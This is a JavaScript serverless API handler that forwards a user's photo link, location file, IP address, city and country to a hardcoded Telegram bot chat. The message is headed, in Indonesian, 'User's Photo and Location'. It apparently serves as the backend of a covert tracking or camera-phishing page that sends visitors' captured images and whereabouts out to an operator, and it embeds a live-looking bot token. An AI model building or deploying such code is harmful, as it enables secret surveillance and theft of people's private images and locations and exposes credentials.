export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { fileName, ipDetails } = req.body;

    const botToken = 'AAHcrDP5UiHtBO9wqeY5Nq6dQg7RAZB4JFM';
    const chatId = '5122187027';
    const photoUrl = `https://long-delta.vercel.app//uploads/${fileName}`;
    const locationUrl = `https://long-delta.vercel.app/uploads/${fileName}.json`;

    const message = `
      📸 *Foto dan Lokasi Pengguna* 📍
      - Foto: [Lihat Foto](${photoUrl})
      - Lokasi: [Lihat Lokasi](${locationUrl})
      - IP: ${ipDetails.ip}
      - Kota: ${ipDetails.city}
      - Negara: ${ipDetails.country}
    `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown',
          }),
        }
      );

      if (response.ok) {
        res.status(200).json({ message: 'Telegram message sent successfully' });
      } else {
        res.status(500).json({ message: 'Failed to send Telegram message' });
      }
    } catch (error) {
      console.error(error);
      res.status(500).json({ message: 'Internal server error' });
    }
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
